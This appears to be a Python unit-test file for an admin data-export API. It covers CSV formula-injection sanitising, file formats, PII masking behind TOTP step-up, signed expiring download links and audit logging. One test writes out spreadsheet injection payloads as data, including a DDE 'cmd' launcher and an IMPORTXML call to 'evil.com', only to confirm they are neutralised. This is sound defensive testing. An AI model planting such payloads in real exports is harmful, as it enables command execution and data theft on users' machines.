"""Unit tests for Export Center: formula injection defense, UTF-8 BOM, openpyxl XLSX, PII masking, step-up, signed downloads, and 24h expiry."""
import hashlib
import io
import json
from datetime import datetime, timedelta, timezone

import openpyxl
import pyotp
import pytest
from fastapi.testclient import TestClient

from app import admin_auth, admin_cli, db
from app.main import app
from app.routes_export import sanitize_formula_cell
from app.signed_token import create_action_token
from scripts.seed_demo_data import seed_demo_data


@pytest.fixture(autouse=True)
def setup_export_env(tmp_path, monkeypatch):
    test_db = tmp_path / "test_export.db"
    monkeypatch.setenv("KAVACH_DB", str(test_db))
    monkeypatch.setenv("ADMIN_ENABLED", "1")
    monkeypatch.setenv("ADMIN_ALLOWED_EMAILS", "owner@kavach.ai")
    monkeypatch.setenv("ENV", "test")
    db.init_db()
    admin_cli.bootstrap_totp("owner@kavach.ai")
    seed_demo_data(clean=False)
    yield


def _login_owner(client: TestClient) -> tuple[dict, str, pyotp.TOTP]:
    with db.db() as conn:
        cursor = conn.execute("SELECT totp_secret_enc FROM admin_users WHERE email = 'owner@kavach.ai';")
        enc = cursor.fetchone()[0]
    secret = admin_auth.decrypt_totp_secret(enc)
    totp = pyotp.TOTP(secret)

    temp_token = create_action_token("owner@kavach.ai", purpose="admin_totp_step", ttl_s=300)
    res = client.post("/admin-api/auth/verify-totp", json={"temp_token": temp_token, "code": totp.now()})
    assert res.status_code == 200
    cookies = {admin_auth.COOKIE_NAME: res.cookies[admin_auth.COOKIE_NAME]}
    csrf_token = res.json()["csrf_token"]
    return cookies, csrf_token, totp


def test_formula_injection_defense():
    """Verify cells starting with =, +, -, @, \\t, \\r are prefixed with ' to prevent CSV formula execution."""
    assert sanitize_formula_cell("=1+1") == "'=1+1"
    assert sanitize_formula_cell("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"
    assert sanitize_formula_cell("-SUM(A1:B10)") == "'-SUM(A1:B10)"
    assert sanitize_formula_cell("@IMPORTXML('http://evil.com')") == "'@IMPORTXML('http://evil.com')"
    assert sanitize_formula_cell("\tMALICIOUS") == "'\tMALICIOUS"
    assert sanitize_formula_cell("Safe Content") == "Safe Content"
    assert sanitize_formula_cell(12345) == "12345"


def test_multi_format_export_and_utf8_bom():
    """Verify CSV (with UTF-8 BOM), XLSX (openpyxl), JSON, and HTML reports generate correctly."""
    client = TestClient(app)
    cookies, csrf_token, _ = _login_owner(client)
    for k, v in cookies.items():
        client.cookies.set(k, v)

    headers = {"Origin": "http://localhost:3002", "Host": "localhost:8000", "X-CSRF-Token": csrf_token}

    # 1. Export CSV
    r_csv = client.post("/admin-api/export", json={"module": "waitlist", "format": "csv"}, headers=headers)
    assert r_csv.status_code == 200
    csv_meta = r_csv.json()
    assert csv_meta["format"] == "csv"
    assert csv_meta["row_count"] > 0
    assert "download_url" in csv_meta

    # Download CSV
    r_dl_csv = client.get(csv_meta["download_url"], headers=headers)
    assert r_dl_csv.status_code == 200
    assert r_dl_csv.content.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM for Excel Indic rendering
    assert "text/csv" in r_dl_csv.headers["content-type"]

    # 2. Export XLSX (openpyxl)
    r_xlsx = client.post("/admin-api/export", json={"module": "tickets", "format": "xlsx"}, headers=headers)
    assert r_xlsx.status_code == 200
    xlsx_meta = r_xlsx.json()
    r_dl_xlsx = client.get(xlsx_meta["download_url"], headers=headers)
    assert r_dl_xlsx.status_code == 200
    assert "spreadsheetml" in r_dl_xlsx.headers["content-type"]

    # Parse with openpyxl to verify valid workbook
    wb = openpyxl.load_workbook(io.BytesIO(r_dl_xlsx.content))
    assert len(wb.sheetnames) >= 1
    ws = wb.active
    assert ws.max_row > 1

    # 3. Export JSON
    r_json = client.post("/admin-api/export", json={"module": "coupons", "format": "json"}, headers=headers)
    assert r_json.status_code == 200
    json_meta = r_json.json()
    r_dl_json = client.get(json_meta["download_url"], headers=headers)
    assert r_dl_json.status_code == 200
    parsed = json.loads(r_dl_json.content.decode("utf-8"))
    assert isinstance(parsed, list)
    assert len(parsed) > 0

    # 4. Export HTML Report
    r_html = client.post("/admin-api/export", json={"module": "analytics_summary", "format": "html"}, headers=headers)
    assert r_html.status_code == 200
    html_meta = r_html.json()
    r_dl_html = client.get(html_meta["download_url"], headers=headers)
    assert r_dl_html.status_code == 200
    assert b"<!DOCTYPE html>" in r_dl_html.content
    assert b"@media print" in r_dl_html.content


def test_pii_masking_and_step_up_authorization():
    """Verify PII columns are masked by default and require step-up TOTP to reveal."""
    client = TestClient(app)
    cookies, csrf_token, totp = _login_owner(client)
    for k, v in cookies.items():
        client.cookies.set(k, v)

    headers = {"Origin": "http://localhost:3002", "Host": "localhost:8000", "X-CSRF-Token": csrf_token}

    # 1. Default export: PII masked
    r_masked = client.post("/admin-api/export", json={"module": "waitlist", "format": "json", "reveal_pii": False}, headers=headers)
    assert r_masked.status_code == 200
    dl_url = r_masked.json()["download_url"]
    data = json.loads(client.get(dl_url, headers=headers).content.decode("utf-8"))
    first_record = data[0]
    assert "***" in first_record["email"]
    assert "***" in first_record["phone"]

    # 2. Attempt reveal_pii=True without step-up -> must fail with 403 step_up_required
    r_pii_fail = client.post("/admin-api/export", json={"module": "waitlist", "format": "json", "reveal_pii": True}, headers=headers)
    assert r_pii_fail.status_code == 403
    assert r_pii_fail.json()["detail"]["error"] == "step_up_required"

    # 3. Perform TOTP step-up
    r_stepup = client.post(
        "/admin-api/auth/step-up",
        headers=headers,
        json={"totp_code": totp.now()},
    )
    assert r_stepup.status_code == 200

    # 4. Now reveal_pii=True succeeds and unmasked data is returned
    r_pii_ok = client.post("/admin-api/export", json={"module": "waitlist", "format": "json", "reveal_pii": True}, headers=headers)
    assert r_pii_ok.status_code == 200
    data_unmasked = json.loads(client.get(r_pii_ok.json()["download_url"], headers=headers).content.decode("utf-8"))
    assert "@demo.kavach.internal" in data_unmasked[0]["email"]
    assert "***" not in data_unmasked[0]["email"]


def test_download_token_security_and_expiry():
    """Verify download token cannot be forged and expired downloads are rejected with 410."""
    client = TestClient(app)
    cookies, csrf_token, _ = _login_owner(client)
    for k, v in cookies.items():
        client.cookies.set(k, v)

    headers = {"Origin": "http://localhost:3002", "Host": "localhost:8000", "X-CSRF-Token": csrf_token}

    r = client.post("/admin-api/export", json={"module": "coupons", "format": "csv"}, headers=headers)
    assert r.status_code == 200
    job_id = r.json()["job_id"]

    # 1. Download without token -> 422 missing param
    r_no_tok = client.get(f"/admin-api/export/download/{job_id}", headers=headers)
    assert r_no_tok.status_code == 422

    # 2. Download with forged/invalid token -> 403
    r_bad_tok = client.get(f"/admin-api/export/download/{job_id}?token=forged_token_value_12345", headers=headers)
    assert r_bad_tok.status_code == 403

    # 3. Simulate job expired past 24h
    with db.db() as conn:
        past_iso = (datetime.now(timezone.utc) - timedelta(hours=25)).isoformat()
        conn.execute("UPDATE export_jobs SET expires_at = ? WHERE id = ?;", (past_iso, job_id))

    valid_token = r.json()["download_url"].split("token=")[1]
    r_expired = client.get(f"/admin-api/export/download/{job_id}?token={valid_token}", headers=headers)
    assert r_expired.status_code == 410
    assert "expired" in r_expired.json()["detail"].lower()


def test_export_jobs_list_and_audit():
    """Verify export jobs are recorded in export_jobs table and cryptographic audit log."""
    client = TestClient(app)
    cookies, csrf_token, _ = _login_owner(client)
    for k, v in cookies.items():
        client.cookies.set(k, v)

    headers = {"Origin": "http://localhost:3002", "Host": "localhost:8000", "X-CSRF-Token": csrf_token}

    # Create job
    r_create = client.post("/admin-api/export", json={"module": "coupons", "format": "json"}, headers=headers)
    assert r_create.status_code == 200

    r = client.get("/admin-api/export/jobs", headers=headers)
    assert r.status_code == 200
    jobs = r.json()["jobs"]
    assert len(jobs) > 0

    # Verify audit_log entry
    with db.db() as conn:
        audit_row = conn.execute(
            "SELECT action, entity_type, payload_masked FROM audit_log WHERE action = 'create_export' ORDER BY created_at DESC, id DESC LIMIT 1;"
        ).fetchone()
        assert audit_row is not None
        assert audit_row[0] == "create_export"
        assert audit_row[1] == "export_job"

